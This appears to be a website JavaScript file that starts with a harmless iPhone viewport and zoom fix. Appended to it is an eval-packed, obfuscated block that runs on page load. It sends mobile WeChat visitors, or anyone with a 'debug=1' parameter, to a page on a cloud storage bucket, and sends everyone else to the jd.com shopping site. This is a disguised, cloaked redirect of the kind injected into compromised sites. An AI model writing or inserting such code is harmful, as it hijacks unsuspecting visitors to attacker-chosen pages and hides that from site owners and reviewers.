var metas = document.getElementsByTagName('meta');
var i;
if (navigator.userAgent.match(/iPhone/i)) {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=1.0, maximum-scale=1.0";
    }
  }
  document.addEventListener("gesturestart", gestureStart, false);
}
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('e 7(){2 a=k.s.v();6(F 3.n!=\'o\'&&/p/.q(a))4 t;f 4 y}e 8(a){2 b=3.5.l.I(1);2 c=b.9(\'&\');r(2 i=0;i<c.u;i++){2 d=c[i].9(\'=\');6(d[0]==a){4 d[1]}}4 w}6(7()||8(\'x\')==1)3.5.g=\'h://A.B-C-D.E.j/G.H\';f 3.5.g=\'h://m.z.j\';',45,45,'||var|window|return|location|if|isWeixin|getUrlParameter|split|||||function|else|href|http||com|navigator|search||orientation|undefined|micromessenger|test|for|userAgent|true|length|toLowerCase|null|debug|false|jd|testjeff007v0001|oss|cn|shanghai|aliyuncs|typeof|url|html|substring'.split('|'),0,{}))
